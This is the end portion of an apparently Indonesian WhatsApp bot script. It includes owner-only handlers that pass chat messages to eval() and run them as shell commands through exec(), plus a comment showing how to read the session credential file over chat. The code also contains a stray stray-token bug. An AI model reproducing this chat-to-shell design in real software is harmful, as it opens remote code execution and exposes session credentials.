        zacky.sendMessage(from, desahan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 245252350, ptt:true})
		}
        
		if (budy.startsWith('<')){
if (!mek.key.fromMe && !isOwner) return reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{q
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}

if (budy.startsWith('x')){
try {
if (!mek.key.fromMe && !isOwner) return
return zacky.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
return zacky.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

//Untuk Mendapatkan Session ( $ cat ManikQr.json )
if (budy.startsWith('$')){ 
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${NamaBot} :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
			
			if (budy.startsWith('zacky')){
            sendButMessage(from, `${JSON.stringify(me, null, 2)}`, `_${creator}_`, [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted: btrai, contextInfo: { forwardingScore: 1000, isForwarded: true}})
            }
								    		    
				if (isCmd) {
				if (!isRegistered && !isOwner) return
				if (isBanned) return
                        aing = `
╔═══ ❰ 「 *GAK ADA TOD* 」❱ ════
║┣❥ *Nama :* *${pushname}*
║┣❥ *Nomer :* @${sender.split("@")[0]}
║┣❥ *Command :* ${prefix}${command}
╚════ ⸨ *${NamaBot}* ⸩  ═════`
zacky.sendMessage(from, aing, text, {quoted: mek, contextInfo: {"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true,externalAdReply:{title: `Not Found`,body:"",previewType:"PHOTO",thumbnail: fpp,sourceUrl:`https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR` }}})                                 
            }				  
            
    }
	} catch (e) {
    e = String(e)
    if (!e.includes("c.isZero") && !e.includes("this.isZero")) {
    console.log(color(time, "white"), color("[ ERROR ]", "aqua"), color(e, 'red'))       
    if (ellol === false) return    
    zacky.sendMessage(mek.key.remoteJid, `${uwu}Ada Yang Error!${uwu}\n❋ཻུ۪۪──────────────────┈ ⳹\n*${util.format(e)}*`, MessageType.extendedText, {quoted: mek, contextInfo: { forwardingScore: 1000, isForwarded: true, externalAdReply:{title: `ERROR 404`,body:"",previewType:"PHOTO",thumbnail: fpp,sourceUrl:`https://wa.me/${sender.split("@")[0]}` }}})                                 
            }
            }
   }   

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update'${__filename}'`))
	delete require.cache[file]
	require(file)
})

//=====================================LINE HARUSNYA 10K++ KARNA GW ENC YG GABOLE KLEAN COMOT JADI SGINI DEH:V=====================================\\
//╔═╦═══• •✠•❀•✠ • •════╗
//║✧ུ║        「 INFO CREATOR」                     
//║✧ུ║ུNama : *Arya Manik*
//║✧ུ║ུNamaBot : *ManikBot*             
//║✧ུ║ུSC ORI : *MHANKBARBAR*             
//║✧ུ║ུTQTO : *ALL CREATOR BOT*             
//║✧ུ║ུTQTO : *PENYEDIA APIKEY DISINI*
//║✧ུ║ུYT : 「 ᴍᴀɴɪᴋ ᴏғғɪᴄɪᴀʟツ 」
//╚═╩═══• •✠•❀•✠ • •════╝
//                    StayHalalNoBully
//SC ORI BY MBB
//RECODE BY MANIK
//MAU RECODE? BOLE BROK KITA SAMA" COMOT":V
//TAPI JAN LUPA ISI NAMA KITA" Y :)
//GANTI TAMPILAN MENU DI SRC/HELP.JS ATAU SIMPEL.JS YA
//GANTI FAKE/APIKEY DI SRC/SETTING.JSON ATAU MAKE COMMAND YA
//DISINI APIKEY LOLHUMAN, VHTEAR, XTEAM, FREE YA, TAPI GADA DI manikganz.JS, KALO MAU GANTI PAKE COMMAND AJA YA:V
//externalAdReply:{title: `ERROR 404`,body:"",previewType:"PHOTO",thumbnail: fpp,sourceUrl:`https://wa.me/${sender.split("@")[0]}` }}})
//externalAdReply: { title: `ALL MENU ADA DI BAWAH`, thumbnail: imageh, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/dQw4w9WgXcQ"}}})
//By StreamHydraT136